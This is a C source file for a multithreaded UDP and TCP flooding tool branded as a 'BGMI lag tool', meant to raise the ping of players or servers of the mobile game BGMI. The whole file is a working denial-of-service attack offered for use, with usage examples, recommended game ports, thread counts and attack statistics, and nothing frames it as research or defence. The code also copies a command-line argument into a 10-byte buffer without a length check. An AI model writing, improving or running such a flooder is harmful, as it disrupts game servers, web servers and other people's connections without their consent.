#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sched.h>
#include <sys/socket.h>

#define MAX_PACKET_SIZE 65507
#define DEFAULT_THREADS 1500
#define MAX_THREADS 5000

volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
int global_sock;
struct sockaddr_in global_dest;
char attack_method[10] = "udp";
int current_ping = 0;

// BGMI Optimized Payloads
char *payloads[] = {
    "\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x02\x00\x00\x00\x01\x00\x00\x00",
    "\x03\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
    "\x04\x00\x00\x00\x02\x00\x00\x00",
    "\x05\x00\x00\x00\x0a\x00\x00\x00",
    "\x06\x00\x00\x00\x14\x00\x00\x00",
    "\x07\x00\x00\x00\x1e\x00\x00\x00",
    "\x08\x00\x00\x00\x28\x00\x00\x00",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",
    "\xff\xfe\xfd\xfc\xfb\xfa\xf9\xf8\xf7\xf6\xf5\xf4\xf3\xf2\xf1\xf0",
    "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa",
    "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55",
    "\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef",
};

int payload_count = sizeof(payloads) / sizeof(payloads[0]);

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              🔥 RATS X ARMY - BGMI LAG TOOL 🔥                 ║\n");
    printf("║                    Target: 677ms+ Ping                          ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║  Usage: ./attack <IP> <PORT> <TIME> <THREADS> [METHOD]           ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Examples:                                                       ║\n");
    printf("║  ./attack 1.1.1.1 443 60 1500 udp    → 677ms+ ping              ║\n");
    printf("║  ./attack 1.1.1.1 14000 90 2000 udp  → Extreme lag              ║\n");
    printf("║  ./attack 1.1.1.1 80 45 1000 tcp     → Web server lag           ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Best BGMI Ports: 443, 8080, 14000, 27015-27030                 ║\n");
    printf("║  Recommended Threads: 1500 = 677ms ping                         ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      📊 ATTACK STATS 📊                          ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets: %-20llu                                    ║\n", total_packets);
    printf("║  Total Data:    %-20llu MB                                    ║\n", total_bytes / (1024 * 1024));
    printf("║  Peak PPS:      %-20d                                         ║\n", total_packets / (time(NULL) - (total_packets ? 1 : 0)));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\n🔥 Attack Stopped! Ping will return to normal now.\n\n");
    exit(0);
}

// UDP Attack Thread - Main for BGMI lag
void *udp_thread(void *arg) {
    int local_packets = 0;
    int local_bytes = 0;
    int idx = 0;
    int retry = 0;
    
    while (running) {
        idx = rand() % payload_count;
        int len = strlen(payloads[idx]);
        
        int ret = sendto(global_sock, payloads[idx], len, 0,
                   (struct sockaddr *)&global_dest, sizeof(global_dest));
        
        if (ret > 0) {
            local_packets++;
            local_bytes += len;
            retry = 0;
        } else {
            retry++;
            if (retry > 5) break;
        }
        
        if (local_packets % 500 == 0) {
            sched_yield();
        }
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    return NULL;
}

// TCP Attack Thread - For web servers
void *tcp_thread(void *arg) {
    int local_packets = 0;
    char *http_payload = "GET / HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        connect(sock, (struct sockaddr *)&global_dest, sizeof(global_dest));
        send(sock, http_payload, strlen(http_payload), 0);
        close(sock);
        
        local_packets++;
        if (local_packets % 100 == 0) sched_yield();
    }
    
    __sync_fetch_and_add(&total_packets, local_packets);
    return NULL;
}

// Show real-time ping effect
void *ping_monitor(void *arg) {
    int duration = *(int *)arg;
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    int estimated_ping = 50;
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      📡 LIVE PING MONITOR 📡                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    while (running && (time(NULL) - start) < duration) {
        int elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        unsigned long long current_packets = total_packets;
        int pps = current_packets - last_packets;
        
        // Calculate estimated ping based on packet rate
        if (pps < 500) estimated_ping = 50;
        else if (pps < 1000) estimated_ping = 100;
        else if (pps < 1500) estimated_ping = 200;
        else if (pps < 2000) estimated_ping = 350;
        else if (pps < 2500) estimated_ping = 500;
        else if (pps < 3000) estimated_ping = 677;
        else estimated_ping = 800;
        
        printf("║ [%3d/%3d] │ Packets: %10llu │ PPS: %5d │ EST. PING: %4dms ║\n", 
               elapsed, duration, current_packets, pps, estimated_ping);
        fflush(stdout);
        
        last_packets = current_packets;
        sleep(1);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL));
    
    if (argc < 4) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc >= 5) ? atoi(argv[4]) : DEFAULT_THREADS;
    
    if (argc >= 6) {
        strcpy(attack_method, argv[5]);
    }
    
    // Validate inputs
    if (duration <= 0 || duration > 300) {
        printf("⚠️ Duration must be 1-300 seconds! Using 60.\n");
        duration = 60;
    }
    if (threads < 100 || threads > MAX_THREADS) {
        printf("⚠️ Threads must be 100-5000! Using 1500.\n");
        threads = 1500;
    }
    if (port < 1 || port > 65535) {
        printf("⚠️ Invalid port! Using 14000.\n");
        port = 14000;
    }
    
    banner();
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    🎯 ATTACK CONFIGURATION 🎯                    ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Target IP:    %s                                              ║\n", ip);
    printf("║  Target Port:  %d                                                ║\n", port);
    printf("║  Duration:     %d seconds                                        ║\n", duration);
    printf("║  Threads:      %d                                                ║\n", threads);
    printf("║  Method:       %s                                                ║\n", attack_method);
    printf("║  Expected Ping: %dms+                                           ║\n", threads == 1500 ? 677 : (threads > 2000 ? 800 : 500));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    // Create socket
    global_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (global_sock < 0) {
        perror("Socket failed");
        exit(1);
    }
    
    // Optimize socket
    int buffer_size = 8 * 1024 * 1024;
    setsockopt(global_sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Setup destination
    memset(&global_dest, 0, sizeof(global_dest));
    global_dest.sin_family = AF_INET;
    global_dest.sin_port = htons(port);
    global_dest.sin_addr.s_addr = inet_addr(ip);
    
    printf("\n🔥 ATTACK STARTING! Press Ctrl+C to stop\n");
    printf("⚡ Target: %s:%d\n", ip, port);
    printf("🎯 Goal: 677ms+ ping during attack\n\n");
    
    // Create attack threads based on method
    pthread_t threads_arr[threads];
    void *(*thread_func)(void *);
    
    if (strcmp(attack_method, "tcp") == 0) {
        thread_func = tcp_thread;
    } else {
        thread_func = udp_thread;  // Default UDP for BGMI
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&threads_arr[i], NULL, thread_func, NULL);
    }
    
    // Start ping monitor
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, ping_monitor, &duration);
    
    // Wait for duration
    sleep(duration);
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }
    pthread_join(monitor_thread, NULL);
    
    close(global_sock);
    
    printf("\n\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ✅ ATTACK COMPLETE ✅                         ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets: %-20llu                                    ║\n", total_packets);
    printf("║  Total Data:    %-20llu MB                                    ║\n", total_bytes / (1024 * 1024));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\n✅ Ping will return to normal now!\n");
    printf("🔥 Attack Complete! @ITS_BFC 🔥\n\n");
    
    return 0;
}